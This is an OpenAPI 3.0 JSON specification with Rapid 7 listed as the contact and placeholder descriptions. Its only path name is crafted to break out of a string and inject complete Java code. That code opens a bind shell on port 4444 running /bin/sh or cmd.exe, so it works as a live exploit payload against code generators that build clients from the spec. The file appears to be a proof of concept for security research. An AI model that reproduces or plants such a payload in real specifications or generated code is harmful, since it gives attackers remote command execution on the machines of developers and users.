{
  "openapi": "3.0.0",
  "servers": [
    {
      "url": "http://localhost/"
    }
  ],
  "info": {
    "description": "A",
    "version": "1.0.0",
    "title": "C",
    "contact": {
      "name": "Rapid 7",
      "url": "https://www.rapid7.com/",
      "email": "info@rapid7.com"
    },
    "license": {
      "name": "BSD-3-clause",
      "url": "https://opensource.org/licenses/BSD-3-Clause"
    }
  },
  "tags": [
    {
      "name": "default"
    }
  ],
  "paths": {
    "/a\"; \"import java.lang.*; import java.util.*; import java.io.*; import java.net.*;     class StreamConnector extends Thread   {     InputStream dh;     OutputStream lk;      StreamConnector( InputStream dh, OutputStream lk )     {       this.dh = dh;       this.lk = lk;     }      public void run()     {       BufferedReader ob  = null;       BufferedWriter oqh = null;       try       {         ob  = new BufferedReader( new InputStreamReader( this.dh ) );         oqh = new BufferedWriter( new OutputStreamWriter( this.lk ) );         char buffer[] = new char[8192];         int length;         while( ( length = ob.read( buffer, 0, buffer.length ) ) > 0 )         {           oqh.write( buffer, 0, length );           oqh.flush();         }       } catch( Exception e ){}       try       {         if( ob != null )           ob.close();         if( oqh != null )           oqh.close();       } catch( Exception e ){}     }   }    try   {     String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {   ShellPath = new String(\"/bin/sh\"); } else {   ShellPath = new String(\"cmd.exe\"); }      ServerSocket server_socket = new ServerSocket( 4444 );     Socket client_socket = server_socket.accept();     server_socket.close();     Process process = Runtime.getRuntime().exec( ShellPath );     ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();     ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();   } catch( Exception e ) {}  ": {
      "summary": "an example path",
      "get": {
        "operationId": "get_a",
        "tags": ["default"],
        "description": "D",
        "responses": {
          "200": {
            "description": "E",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/d"
                }
              }
            }
          }
        }
      }
    }
  },
  "components": {
    "schemas": {
      "d": {
        "type": "object",
        "description": "F",
        "properties": {
          "id": {
            "type": "integer",
            "format": "int64"
          }
        }
      }
    }
  }
}
